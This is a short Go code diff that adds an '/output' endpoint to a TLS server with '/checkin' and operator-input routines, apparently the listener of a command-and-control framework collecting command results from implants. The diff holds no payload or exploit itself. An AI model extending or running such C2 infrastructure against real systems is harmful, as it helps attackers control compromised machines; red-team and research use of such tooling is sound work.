@@ -25,9 +25,15 @@ func readInput() {
 	}
 }
 
+func outputHandler(w http.ResponseWriter, r *http.Request) {
+	body, _ := io.ReadAll(r.Body)
+	fmt.Println(string(body))
+}
+
 func main() {
 	http.HandleFunc("/checkin", checkinHandler)
 	fmt.Println("[+] Server listening on :443")
+	http.HandleFunc("/output", outputHandler)
 	go readInput()
 	http.ListenAndServeTLS(":443", "server.crt", "server.key", nil)
 }
